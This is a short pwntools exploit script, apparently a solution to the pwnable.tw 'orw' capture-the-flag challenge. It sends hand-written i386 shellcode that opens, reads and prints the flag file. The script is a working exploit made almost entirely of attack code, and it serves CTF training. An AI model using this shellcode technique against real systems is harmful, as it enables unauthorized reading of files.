from pwn import *

context.arch = 'i386'
r = remote("chall.pwnable.tw", 10001)
#r = process("./orw")

shellcode = asm('\n'.join([
    'push %d' % u32('ag\0\0'),
    'push %d' % u32('w/fl'),
    'push %d' % u32('e/or'),
    'push %d' % u32('/hom'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0x5',
    'int 0x80',

    'mov edx, 0x60',
    'mov ebx, eax',
    'mov ecx, esp',
    'mov eax, 0x3',
    'int 0x80',

    'mov edx, 0x60',
    'mov ebx, 0x1',
    'mov ecx, esp',
    'mov eax, 0x4',
    'int 0x80',
 
]))

r.recvuntil('Give my your shellcode:')

payload = shellcode

r.send(payload)
print r.recv(60)

r.interactive()
